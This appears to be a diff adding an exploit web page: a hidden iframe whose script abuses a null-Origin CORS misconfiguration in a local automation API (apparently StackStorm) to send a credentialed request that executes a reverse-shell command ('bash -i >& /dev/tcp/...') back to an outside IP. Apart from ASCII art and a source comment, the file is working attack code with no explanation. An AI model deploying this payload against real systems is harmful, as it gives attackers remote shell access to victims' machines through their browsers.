@@ -1,0 +1,51 @@
+<pre>
+      ,;;*;;;;,
+     .-'``;-');;.
+    /'  .-.  /*;;
+  .'    \d    \;;               .;;;,
+ / o      `    \;    ,__.     ,;*;;;*;,
+ \__, _.__,'   \_.-') __)--.;;;;;*;;;;,
+  `""`;;;\       /-')_) __)  `\' ';;;;;;
+     ;*;;;        -') `)_)  |\ |  ;;;;*;
+     ;;;;|        `---`    O | | ;;*;;;
+     *;*;\|                 O  / ;;;;;*
+    ;;;;;/|    .-------\      / ;*;;;;;
+   ;;;*;/ \    |        '.   (`. ;;;*;;;
+   ;;;;;'. ;   |          )   \ | ;;;;;;
+   ,;*;;;;\/   |.        /   /` | ';;;*;
+    ;;;;;;/    |/       /   /__/   ';;;
+    '"*"'/     |       /    |      ;*;
+         `""""`        `""""`     ;'
+</pre>
+<!-- from https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties -->
+<iframe style="visibility: hidden;" sandbox="allow-scripts allow-top-navigation allow-forms" 
+src='data:text/html,<script>
+
+    function status(response) {
+        if (response.status >= 200 && response.status < 300) { return Promise.resolve(response) } 
+        else { return Promise.reject(new Error(response.statusText)) } 
+    };
+        
+    function json(response) { return response.json() };
+
+    console.log(1);
+    var myHeaders = new Headers();
+    myHeaders.append("Content-Type", "application/json");
+    myHeaders.append("Origin", "null");
+    var myInit = { 
+        credentials: "include",
+        method: "POST",
+        headers: myHeaders,
+        body: "{\"action\":\"core.remote\",\"parameters\":{\"cmd\":\"bash -i >& /dev/tcp/172.28.0.1/1337 0>&1\",\"hosts\":\"127.0.0.1\",\"cwd\":\"/tmp\"},\"context\":{\"trace_context\":{}}}"        
+    };
+
+    fetch("https://localhost:4443/api/v1/executions", myInit)
+    .then(status)
+    .then(json)
+    .then(function(data) {
+        console.log("Request succeeded with JSON response", data);
+    }).catch(function(error) {
+        console.log("Request failed", error);
+    });
+    console.log(3)
+</script>'></iframe>
